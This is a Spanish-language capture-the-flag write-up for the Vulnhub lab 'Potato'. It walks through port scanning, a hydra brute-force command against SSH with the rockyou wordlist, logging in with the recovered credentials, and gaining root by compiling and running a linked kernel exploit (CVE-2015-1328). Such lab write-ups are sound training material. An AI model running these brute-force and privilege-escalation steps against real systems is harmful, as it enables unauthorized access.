---
title: Vulnhub - Potato
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'Brute Force', 'Kernel Exploitation (CVE-2015-1328)']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Potato/logo.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Potato Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **Brute Force, Kernel Exploitation (CVE-2015-1328)**


### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Potato/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos**

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Potato/02-versions.png)

c. Después de hacer fuzzing por directorios, fichero **.php, zip, php.bak, .conf**, únicamente encontramos **info.php** el cual no tiene información que nos permita acceder a la **`Máquina Víctima`**, por lo que el último recurso es realizar fuerza bruta sobre el servicio SSH y con la pista que nos dan:

```bash
Hint: "If you ever get stuck, try again with the name of the lab"
```

* Es decir, usaremos hydra con el usuario **potato** (Nombre del Laboratorio) y usaremos el diccionario rockyou.txt

    ```bash
    root@kali> hydra -l potato -P /usr/share/wordlists/rockyou.txt ssh://<IP>:7120 -t 4

    [7120][ssh] host: 192.168.100.23   login: potato   password: letmein
    ```

    * **`:7120`** Puerto del servicio SSH en la máquina.
    * **`-t 4`** Realizamos 4 peticiones en paralelo, ya que, si hacemos más de 4 tendremos conflictos con este servicio.

d. Nos autenticamos en el servicio SSH con las credenciales **potato:letmein**

```bash
root@kali> ssh potato@192.168.100.23 -p 7120
```

### Escalada de Privilegios 💹

a. La versión del kernel es antigua

```bash
potato@ubuntu:~$ uname -a
Linux ubuntu 3.13.0-24-generic
```

* Al buscar por vulnerabilidades llegamos a [exploit](https://www.exploit-db.com/exploits/37292)

b. Guardamos el exploit en un archivo para luego compilarlo

```bash
potato@ubuntu:~$ gcc backup.c -o backup
potato@ubuntu:~$ chmod +x backup
potato@ubuntu:~$ ./backup

# bash
root@ubuntu:/home/potato# cd /root
root@ubuntu:/root# cat proof.txt 
SunCSR.Team.Potato.af6d45da1f1181347b9e2139f23c6a5b
```
